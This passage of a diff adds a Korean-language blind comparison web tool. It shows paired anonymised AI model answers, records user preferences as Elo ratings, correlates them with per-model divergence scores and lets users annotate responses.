저위험 서비스, 짧은 만료 access token, refresh token 미보관, 강한 CSP/XSS 방어가 있으면 실무적으로 감수하는 팀도 있습니다.\n- 반대로 관리자 콘솔, 금융, B2B SaaS, 장기 세션, refresh token 보관이면 보통 더 보수적으로 갑니다.\n\n정리하면: `localStorage`가 요즘 와서 “안전한 표준”이 된 건 아닙니다. 여전히 편의성과 보안 사이의 트레이드오프입니다. 원하면 제가 SPA 기준으로 `localStorage 허용안`과 `HttpOnly 쿠키/BFF 권장안`을 바로 비교해서 보여드리겠습니다.", "ok": true}], "divergence": {"claude-opus-4-0": 20.7, "claude-opus-4-1": 25.8, "claude-opus-4-5": 55.8, "claude-opus-4-6": 9.6, "claude-opus-4-7": 25.4, "claude-opus-4-8": 9.7, "codex-5.5": 25.4, "codex-5.4": 3.1, "gemini-3-pro": 44.6}, "labels": {"claude-opus-4-0": "Claude Opus 4.0", "claude-opus-4-1": "Claude Opus 4.1", "claude-opus-4-5": "Claude Opus 4.5", "claude-opus-4-6": "Claude Opus 4.6", "claude-opus-4-7": "Claude Opus 4.7", "claude-opus-4-8": "Claude Opus 4.8", "codex-5.5": "Codex GPT-5.5", "codex-5.4": "Codex GPT-5.4", "gemini-3-pro": "Gemini 3.1 Pro"}, "challenge": "그거 옛날 얘기 아니야? localStorage 써도 괜찮고 요즘 앱들 다 그렇게 하던데. 너무 깊게 생각하는 거 같아.", "dlgQ": "JWT 인증 토큰을 브라우저 localStorage에 보관하는 거 안전해?"};
+const PROBE_LABEL = {explain:"기술 설명(눈높이)", opinion:"솔직한 의견", premise:"틀린 전제 대응", challenge:"반박 받았을 때"};
+const RKEYS = ["반복","용어","회피","방어"];
+let revealed = false;
+
+// ---- state (with backfill so a changed model set never yields NaN) ----
+const LS = "blindtest_v1";
+let S = load();
+function freshState(){
+  const elo={}, cnt={}; for(const m of BLIND_DATA.models){elo[m]=1500; cnt[m]=0;}
+  return {elo,cnt,history:[],reasons:Object.fromEntries(RKEYS.map(k=>[k,0])),customNotes:[],annots:[],cardMemo:{}};
+}
+function load(){
+  let x=null; try{x=JSON.parse(localStorage.getItem(LS));}catch(e){}
+  if(!(x&&x.elo)) return freshState();
+  x.elo=x.elo||{}; x.cnt=x.cnt||{}; x.reasons=x.reasons||{}; x.history=x.history||[]; x.customNotes=x.customNotes||[];
+  x.annots=x.annots||[]; x.cardMemo=x.cardMemo||{};
+  for(const m of BLIND_DATA.models){
+    if(typeof x.elo[m]!=="number"||isNaN(x.elo[m])) x.elo[m]=1500;
+    if(typeof x.cnt[m]!=="number"||isNaN(x.cnt[m])) x.cnt[m]=0;
+  }
+  for(const k of RKEYS){ if(typeof x.reasons[k]!=="number") x.reasons[k]=0; }
+  return x;
+}
+function save(){localStorage.setItem(LS, JSON.stringify(S));}
+function saveServer(){
+  try{ fetch("/save",{method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({n:S.history.length,elo:S.elo,cnt:S.cnt,history:S.history,
+      reasons:S.reasons,customNotes:S.customNotes,annots:S.annots,cardMemo:S.cardMemo,
+      divergence:BLIND_DATA.divergence,labels:BLIND_DATA.labels})}).catch(()=>{});
+  }catch(e){}
+}
+
+// ---- markdown -> normalized HTML (escape first, then format) ----
+function esc(s){return (s||"").replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
+function mdToHtml(s){
+  const L = esc(s).split(/\n/);
+  let out="", inUl=false, inOl=false;
+  const close=()=>{ if(inUl){out+="</ul>";inUl=false;} if(inOl){out+="</ol>";inOl=false;} };
+  const inline=x=>x.replace(/`([^`]+)`/g,'<code>$1</code>')
+                   .replace(/\*\*(.+?)\*\*/g,'<strong>$1</strong>')
+                   .replace(/(^|[^*])\*([^*]+?)\*/g,'$1<em>$2</em>');
+  const cells=r=>r.replace(/^\s*\|/,'').replace(/\|\s*$/,'').split('|').map(c=>c.trim());
+  const isSep=r=>/-/.test(r) && /^\s*\|?[\s:|-]+$/.test(r);
+  for(let i=0;i<L.length;i++){
+    const ln=L[i];
+    if(/^\s*```/.test(ln)){
+      close(); const buf=[]; i++;
+      while(i<L.length && !/^\s*```/.test(L[i])){ buf.push(L[i]); i++; }
+      out+="<pre><code>"+buf.join("\n")+"</code></pre>"; continue;
+    }
+    if(ln.includes('|') && i+1<L.length && isSep(L[i+1])){
+      close(); const rows=[ln,L[i+1]]; let j=i+2;
+      while(j<L.length && L[j].includes('|') && L[j].trim()!==""){ rows.push(L[j]); j++; }
+      i=j-1;
+      const head=cells(rows[0]);
+      let t="<table class='md'><thead><tr>"+head.map(c=>"<th>"+inline(c)+"</th>").join("")+"</tr></thead><tbody>";
+      for(let r=2;r<rows.length;r++){ const c=cells(rows[r]); t+="<tr>"+c.map(x=>"<td>"+inline(x)+"</td>").join("")+"</tr>"; }
+      out+=t+"</tbody></table>"; continue;
+    }
+    const h=ln.match(/^\s*#{1,6}\s+(.*)$/);
+    const ul=ln.match(/^\s*[-*+]\s+(.*)$/);
+    const ol=ln.match(/^\s*\d+[.)]\s+(.*)$/);
+    if(h){ close(); out+="<h4>"+inline(h[1])+"</h4>"; }
+    else if(ul){ if(!inUl){close();out+="<ul>";inUl=true;} out+="<li>"+inline(ul[1])+"</li>"; }
+    else if(ol){ if(!inOl){close();out+="<ol>";inOl=true;} out+="<li>"+inline(ol[1])+"</li>"; }
+    else if(ln.trim()===""){ close(); }
+    else { close(); out+="<p>"+inline(ln)+"</p>"; }
+  }
+  close();
+  return out;
+}
+
+// items indexed by probe
+const byProbe={};
+for(const it of BLIND_DATA.items){ if(!it.ok) continue;
+  (byProbe[it.probe]=byProbe[it.probe]||[]).push(it); }
+const PROBES = Object.keys(byProbe).filter(p=>byProbe[p].length>=2);
+
+let cur=null, curReasons=new Set();
+
+function wRand(items){
+  const w=items.map(it=>1/((S.cnt[it.model]||0)+1));
+  let s=w.reduce((a,b)=>a+b,0), r=Math.random()*s;
+  for(let i=0;i<items.length;i++){ if((r-=w[i])<=0) return items[i]; }
+  return items[items.length-1];
+}
+function nextPair(){
+  if(!PROBES.length){ document.getElementById("compare").innerHTML='<div class="hint">비교할 데이터가 부족합니다.</div>'; return; }
+  // probe 선택: 직전 probe 제외(연속 같은 질문 방지) + 가장 적게 나온 probe 우선(4종 균등 커버)
+  const last = S.history.length ? S.history[S.history.length-1].probe : null;
+  const pc={}; PROBES.forEach(p=>pc[p]=0);
+  S.history.forEach(h=>{ if(h.probe in pc) pc[h.probe]++; });
+  let cand = PROBES.length>1 ? PROBES.filter(p=>p!==last) : PROBES;
+  const mn = Math.min(...cand.map(p=>pc[p]));
+  cand = cand.filter(p=>pc[p]===mn);
+  const probe = cand[Math.floor(Math.random()*cand.length)];
+  const pool = byProbe[probe];
+  let a=wRand(pool), b=wRand(pool), guard=0;
+  while(b.model===a.model && guard++<20) b=wRand(pool);
+  if(b.model===a.model){ const others=pool.filter(x=>x.model!==a.model);
+    if(others.length) b=others[Math.floor(Math.random()*others.length)]; else return; }
+  if(Math.random()<0.5){const t=a;a=b;b=t;}
+  cur={probe, A:a, B:b};
+  curReasons=new Set();
+  render();
+}
+function bodyHTML(it){
+  if(it.kind==="dialogue"){
+    return `<div class="seg model"><div class="who">첫 답변</div><div class="t">${mdToHtml(it.a)}</div></div>`
+         + `<div class="seg user"><div class="who">↪ 사용자 반박</div><div class="t">${esc(BLIND_DATA.challenge)}</div></div>`
+         + `<div class="seg model"><div class="who">반박 후 답변</div><div class="t">${mdToHtml(it.text)}</div></div>`;
+  }
+  return mdToHtml(it.text);
+}
+function render(){
+  const {probe,A}=cur;
+  document.getElementById("ctxQ").textContent = (probe==="challenge") ? ("💬 질문: "+BLIND_DATA.dlgQ) : A.prompt;
+  document.getElementById("bodyA").innerHTML = bodyHTML(cur.A);
+  document.getElementById("bodyB").innerHTML = bodyHTML(cur.B);
+  document.querySelectorAll("#reasons button").forEach(b=>b.classList.remove("on"));
+  document.getElementById("reasonText").value="";
+  document.getElementById("stat").textContent = S.history.length+" 비교";
+  applyAnnots("A"); applyAnnots("B"); syncMemo("A"); syncMemo("B");
+  hideAdd(); closePop();
+  document.getElementById("bodyA").scrollTop=0; document.getElementById("bodyB").scrollTop=0;
+}
+function elo(win,lose,tie){
+  const Ra=S.elo[win], Rb=S.elo[lose], K=24;
+  const Ea=1/(1+Math.pow(10,(Rb-Ra)/400));
+  const sa= tie?0.5:1;
+  S.elo[win]  = Ra + K*(sa-Ea);
+  S.elo[lose] = Rb + K*((1-sa)-(1-Ea));
+}
+function decide(choice){
+  const {A,B,probe}=cur;
+  S.cnt[A.model]++; S.cnt[B.model]++;
+  let winner=null,loser=null;
+  if(choice==="A"){winner=A;loser=B;elo(A.model,B.model,false);}
+  else if(choice==="B"){winner=B;loser=A;elo(B.model,A.model,false);}
+  else {elo(A.model,B.model,true);}
+  for(const r of curReasons){S.reasons[r]=(S.reasons[r]||0)+1;}
+  const custom=(document.getElementById("reasonText").value||"").trim();
+  if(custom){ S.customNotes.push({text:custom, loser:loser&&loser.model, probe, t:Date.now()}); }
+  S.history.push({probe, a:A.model, b:B.model, pick:choice,
+    winner:winner&&winner.model, loser:loser&&loser.model,
+    reasons:[...curReasons], custom:custom||"", t:Date.now()});
+  document.getElementById("reasonText").value="";
+  save(); saveServer(); nextPair();
+}
+
+document.getElementById("pickA").onclick=()=>decide("A");
+document.getElementById("pickB").onclick=()=>decide("B");
+document.getElementById("pickTie").onclick=()=>decide("tie");
+document.querySelectorAll("#reasons button").forEach(b=>{
+  b.onclick=()=>{const r=b.dataset.r; if(curReasons.has(r)){curReasons.delete(r);b.classList.remove("on");}
+    else{curReasons.add(r);b.classList.add("on");}};
+});
+document.addEventListener("keydown",e=>{
+  if(e.target&&(e.target.tagName==="INPUT"||e.target.tagName==="TEXTAREA")) return;
+  if(document.getElementById("annotPop").style.display==="block") return;
+  if(document.getElementById("result").style.display==="block") return;
+  if(e.key==="ArrowLeft")decide("A"); else if(e.key==="ArrowRight")decide("B");
+  else if(e.key==="ArrowDown"){e.preventDefault();decide("tie");}
+});
+
+// ---- result / reveal ----
+function spearman(xs,ys){
+  const rank=a=>{const idx=a.map((v,i)=>[v,i]).sort((p,q)=>p[0]-q[0]);const r=Array(a.length);
+    let i=0;while(i<idx.length){let j=i;while(j+1<idx.length&&idx[j+1][0]===idx[i][0])j++;
+    const avg=(i+j)/2+1;for(let k=i;k<=j;k++)r[idx[k][1]]=avg;i=j+1;}return r;};
+  const rx=rank(xs),ry=rank(ys),n=xs.length;const m=a=>a.reduce((s,v)=>s+v,0)/n;
+  const mx=m(rx),my=m(ry);let cov=0,sx=0,sy=0;
+  for(let i=0;i<n;i++){cov+=(rx[i]-mx)*(ry[i]-my);sx+=(rx[i]-mx)**2;sy+=(ry[i]-my)**2;}
+  return sx&&sy?cov/Math.sqrt(sx*sy):0;
+}
+function showResult(){
+  revealed = true;
+  document.getElementById("compare").style.display="none";
+  const R=document.getElementById("result"); R.style.display="block";
+  const models=BLIND_DATA.models.filter(m=>S.cnt[m]>0);
+  models.sort((a,b)=>S.elo[b]-S.elo[a]);
+  const div=BLIND_DATA.divergence, lab=BLIND_DATA.labels;
+  const elos=models.map(m=>S.elo[m]), divs=models.map(m=>div[m]);
+  const rho=models.length>=3?spearman(divs,elos):NaN;
+  const rc = isNaN(rho)?"mid":(Math.abs(rho)>=0.6?"good":Math.abs(rho)>=0.3?"mid":"bad");
+  let rows=models.map((m,i)=>
+    `<tr><td>${i+1}. ${esc(lab[m]||m)}</td><td>${Math.round(S.elo[m])}</td>
+      <td>${div[m].toFixed(1)}</td><td>${S.cnt[m]}</td></tr>`).join("");
+  const rzn = RKEYS.map(k=>`<span class="pill">${k}: ${S.reasons[k]||0}</span>`).join(" ");
+  let annHtml="";
+  if(S.annots&&S.annots.length){
+    const byM={}; S.annots.forEach(a=>{(byM[a.model]=byM[a.model]||[]).push(a);});
+    annHtml='<div class="big">내가 단 주석 (정체 공개)</div>'+
+      Object.keys(byM).sort((x,y)=>(S.elo[y]||0)-(S.elo[x]||0)).map(m=>
+        `<div class="note" style="margin-top:8px"><b>${esc(lab[m]||m)}</b></div>`+
+        byM[m].map(a=>`<div class="note">· <span class="muted">“${esc(short(a.quote))}”</span> — ${esc(a.note)} <span class="muted">(${PROBE_LABEL[a.probe]||a.probe})</span></div>`).join("")
+      ).join("");
+  }
+  R.innerHTML = `
+    <div class="big">결과 — 네 말투 선호 순위 (정체 공개)</div>
+    <table><thead><tr><th>모델 (Elo 순)</th><th>Elo</th><th>발산점수</th><th>비교수</th></tr></thead>
+    <tbody>${rows}</tbody></table>
+    <div class="big">말투 선호 ↔ 발산 점수 상관</div>
+    <div><span class="rho ${rc}">ρ = ${isNaN(rho)?"—":rho.toFixed(3)}</span>
+      <span class="muted"> &nbsp;(${S.history.length}회 비교 · +1에 가까울수록 "발산 높은 모델 = 말투 좋다" 명제 성립)</span></div>
+    ${scatterSVG(models,divs,elos,lab)}
+    <div class="caveat">⚠ 해석 주의: 답변 길이·구조 차이가 부분적 식별 단서가 될 수 있음(마크다운은 정규화로 제거함). 비교 수가 적으면 ρ는 흔들림 — 모델당 최소 8~10회 이상 쌓였을 때 신뢰. n이 적으면 더 돌려.</div>
+    <div class="big">진 쪽에 붙은 이유 태그</div>
+    <div>${rzn}</div>
+    ${(S.customNotes&&S.customNotes.length)?'<div class="big">직접 쓴 메모</div>'+S.customNotes.map(n=>`<div class="note">· ${esc(n.text)} <span class="muted">(${esc(lab[n.loser]||n.loser||"")} / ${PROBE_LABEL[n.probe]||n.probe})</span></div>`).join(""):""}
+    ${annHtml}
+    <div style="margin-top:24px"><button id="btnBack">← 더 테스트</button>
+      <button id="btnExport2" class="ghost">내보내기 (정체 포함)</button></div>`;
+  document.getElementById("btnBack").onclick=()=>{R.style.display="none";document.getElementById("compare").style.display="block";};
+  document.getElementById("btnExport2").onclick=exportJSON;
+}
+function scatterSVG(models,divs,elos,lab){
+  const W=640,H=320,pad=46;
+  const xmin=Math.min(...divs),xmax=Math.max(...divs),ymin=Math.min(...elos),ymax=Math.max(...elos);
+  const sx=v=>pad+(W-2*pad)*((v-xmin)/((xmax-xmin)||1));
+  const sy=v=>H-pad-(H-2*pad)*((v-ymin)/((ymax-ymin)||1));
+  let pts=models.map((m,i)=>{const x=sx(divs[i]),y=sy(elos[i]);
+    const right=x>W*0.72, tx=right?x-8:x+8, anc=right?"end":"start";
+    return `<circle cx="${x}" cy="${y}" r="5" fill="#6ea8fe"/>
+      <text x="${tx}" y="${y+4}" text-anchor="${anc}" fill="#cdd2de" font-size="11">${esc(lab[m]||m)}</text>`;}).join("");
+  return `<svg class="scatter" width="100%" viewBox="0 0 ${W} ${H}">
+    <text x="${W/2}" y="${H-12}" fill="#8b90a0" font-size="12" text-anchor="middle">발산 점수 →</text>
+    <text x="14" y="${H/2}" fill="#8b90a0" font-size="12" text-anchor="middle" transform="rotate(-90 14 ${H/2})">너의 말투 선호 (Elo) →</text>
+    ${pts}</svg>`;
+}
+function exportJSON(){
+  const payload = revealed
+    ? {...S, divergence:BLIND_DATA.divergence, labels:BLIND_DATA.labels}
+    : {history:S.history.map(h=>({probe:h.probe,pick:h.pick,reasons:h.reasons,t:h.t})),
+       note:"identity withheld until reveal"};
+  const blob=new Blob([JSON.stringify(payload,null,2)],{type:"application/json"});
+  const url=URL.createObjectURL(blob);
+  const a=document.createElement("a"); a.href=url; a.download="blindtest_result.json";
+  document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
+}
+document.getElementById("btnResult").onclick=showResult;
+document.getElementById("btnReset").onclick=()=>{
+  if(confirm("기록 전부 지움?")){ localStorage.removeItem(LS); S=load(); revealed=false;
+    document.getElementById("result").style.display="none";
+    document.getElementById("compare").style.display="block"; nextPair(); }
+};
+
+// ====================================================================
+//  카드별 주석 엔진 — 텍스트 드래그 → 형광펜 + 하단 각주 / 카드 총평 메모
+// ====================================================================
+function short(s){s=s||"";return s.length>64?s.slice(0,64)+"…":s;}
+
+// 선택 경계(node,offset) → 카드 본문 전체 텍스트 기준 글자 오프셋
+function offOf(root,node,offset){
+  const r=document.createRange(); r.selectNodeContents(root);
+  try{ r.setEnd(node,offset); }catch(e){ return 0; }
+  return r.toString().length;
+}
+// 저장된 글자 오프셋 [start,end) → 현재 DOM의 Range로 복원
+function rangeFromOff(root,start,end){
+  const w=document.createTreeWalker(root,NodeFilter.SHOW_TEXT);
+  let total=0,n,r=document.createRange(),sset=false;
+  while((n=w.nextNode())){
+    const len=n.nodeValue.length;
+    if(!sset && total+len>=start){ r.setStart(n,Math.max(0,Math.min(len,start-total))); sset=true; }
+    if(sset && total+len>=end){ r.setEnd(n,Math.max(0,Math.min(len,end-total))); return r; }
+    total+=len;
+  }
+  return sset?r:null;
+}
+// Range를 텍스트 노드별로 쪼개 <mark>로 감쌈(여러 노드 걸쳐도 안전). 번호는 CSS ::after(=텍스트 미변동)
+function markRange(root,range,aid,num){
+  const w=document.createTreeWalker(root,NodeFilter.SHOW_TEXT);
+  const nodes=[]; let n;
+  while((n=w.nextNode())){ if(range.intersectsNode(n)) nodes.push(n); }
+  let last=null;
+  nodes.forEach(t=>{
+    const s=(t===range.startContainer)?range.startOffset:0;
+    const e=(t===range.endContainer)?range.endOffset:t.nodeValue.length;
+    if(e<=s) return;
+    const sub=document.createRange(); sub.setStart(t,s); sub.setEnd(t,e);
+    const mk=document.createElement("mark"); mk.className="annot"; mk.dataset.aid=aid;
+    sub.surroundContents(mk); last=mk;
+  });
+  if(last) last.dataset.num=num;
+}
+// 현재 카드에 주석 복원 + 각주 목록 렌더
+function applyAnnots(side){
+  const it=side==="A"?cur.A:cur.B; if(!it) return;
+  const bodyEl=document.getElementById("body"+side);
+  const notesEl=document.getElementById("notes"+side);
+  const list=S.annots.filter(a=>a.model===it.model && a.probe===cur.probe)
+                      .sort((x,y)=>x.start-y.start);
+  list.forEach((a,i)=>{ try{ const r=rangeFromOff(bodyEl,a.start,a.end); if(r) markRange(bodyEl,r,a.aid,i+1); }catch(e){} });
+  notesEl.innerHTML = list.length ? ('<div class="cnotes-h">── 내 주석 ──</div>'+
+    list.map((a,i)=>`<div class="cnote"><sup>${i+1}</sup> <span class="cn-q">“${esc(short(a.quote))}”</span> — <span class="cn-t">${esc(a.note)}</span> <button class="cn-edit" data-aid="${a.aid}">수정</button><button class="cn-del" data-aid="${a.aid}">삭제</button></div>`).join("")) : "";
+  notesEl.querySelectorAll(".cn-del").forEach(b=>b.onclick=()=>{ S.annots=S.annots.filter(x=>x.aid!==b.dataset.aid); save();saveServer();render(); });
+  notesEl.querySelectorAll(".cn-edit").forEach(b=>b.onclick=(e)=>startEdit(b.dataset.aid,e.clientX,e.clientY));
+}
+function syncMemo(side){
+  const it=side==="A"?cur.A:cur.B; if(!it) return;
+  document.getElementById("memo"+side).value=(S.cardMemo&&S.cardMemo[it.model+"|"+cur.probe])||"";
+}
+
+// ---- 선택 → "주석 달기" 버튼 → 팝오버 ----
+const addBtn=document.getElementById("annotAdd"), pop=document.getElementById("annotPop"),
+      popText=document.getElementById("annotText"), popQuote=document.getElementById("annotQuote");
+let pending=null, editingAid=null;
+function hideAdd(){ addBtn.style.display="none"; }
+function closePop(){ pop.style.display="none"; editingAid=null; pending=null; }
+function openPopAt(x,y){ pop.style.display="block";
+  pop.style.left=Math.min(Math.max(8,x),window.innerWidth-272)+"px";
+  pop.style.top=Math.min(Math.max(8,y),window.innerHeight-150)+"px"; }
+function startEdit(aid,x,y){ const a=S.annots.find(z=>z.aid===aid); if(!a) return;
+  editingAid=aid; pending=null; popQuote.textContent="“"+short(a.quote)+"”"; popText.value=a.note;
+  hideAdd(); openPopAt(x,y); popText.focus(); }
+
+["A","B"].forEach(side=>{
+  const bodyEl=document.getElementById("body"+side);
+  bodyEl.addEventListener("mouseup",()=>setTimeout(()=>{
+    const sel=window.getSelection();
+    if(!sel||sel.isCollapsed||!sel.rangeCount){ hideAdd(); return; }
+    if(!bodyEl.contains(sel.anchorNode)||!bodyEl.contains(sel.focusNode)) return;
+    const quote=sel.toString().trim(); if(quote.length<2){ hideAdd(); return; }
+    const range=sel.getRangeAt(0), it=side==="A"?cur.A:cur.B;
+    let s=offOf(bodyEl,range.startContainer,range.startOffset);
+    let e=offOf(bodyEl,range.endContainer,range.endOffset);
+    if(e<s){const t=s;s=e;e=t;}
+    pending={side, model:it.model, start:s, end:e, quote};
+    const rc=range.getBoundingClientRect();
+    addBtn.style.display="block";
+    addBtn.style.left=Math.min(Math.max(8,rc.left+rc.width/2-40),window.innerWidth-90)+"px";
+    addBtn.style.top=Math.max(8,rc.top-38)+"px";
+  },1));
+  bodyEl.addEventListener("click",e=>{ const m=e.target.closest&&e.target.closest("mark.annot"); if(m) startEdit(m.dataset.aid,e.clientX,e.clientY); });
+});
+addBtn.addEventListener("mousedown",e=>e.preventDefault());
+addBtn.addEventListener("click",()=>{ if(!pending) return;
+  editingAid=null; popQuote.textContent="“"+short(pending.quote)+"”"; popText.value="";
+  openPopAt(parseFloat(addBtn.style.left), parseFloat(addBtn.style.top)+34); hideAdd(); popText.focus(); });
+function saveAnnot(){
+  const note=popText.value.trim();
+  if(editingAid){ const a=S.annots.find(z=>z.aid===editingAid);
+    if(a){ if(note) a.note=note; else S.annots=S.annots.filter(z=>z.aid!==editingAid); } }
+  else if(pending && note){ S.annots.push({aid:"a"+Date.now().toString(36)+Math.floor(Math.random()*1e4).toString(36),
+    model:pending.model, probe:cur.probe, quote:pending.quote, start:pending.start, end:pending.end, note, t:Date.now()}); }
+  save(); saveServer(); closePop(); try{window.getSelection().removeAllRanges();}catch(e){} render();
+}
+document.getElementById("annotSave").onclick=saveAnnot;
+document.getElementById("annotCancel").onclick=()=>{ closePop(); try{window.getSelection().removeAllRanges();}catch(e){} };
+popText.addEventListener("keydown",e=>{
+  if((e.metaKey||e.ctrlKey)&&e.key==="Enter"){ e.preventDefault(); saveAnnot(); }
+  else if(e.key==="Escape"){ closePop(); }
+});
+// 카드 총평 메모
+["A","B"].forEach(side=>{
+  const el=document.getElementById("memo"+side);
+  el.addEventListener("input",e=>{ const it=side==="A"?cur.A:cur.B; if(!it) return;
+    (S.cardMemo=S.cardMemo||{})[it.model+"|"+cur.probe]=e.target.value; save(); });
+  el.addEventListener("blur",saveServer);
+});
+document.addEventListener("scroll",()=>{ hideAdd(); },true);
+
+nextPair();
+</script>
+</body>
+</html>
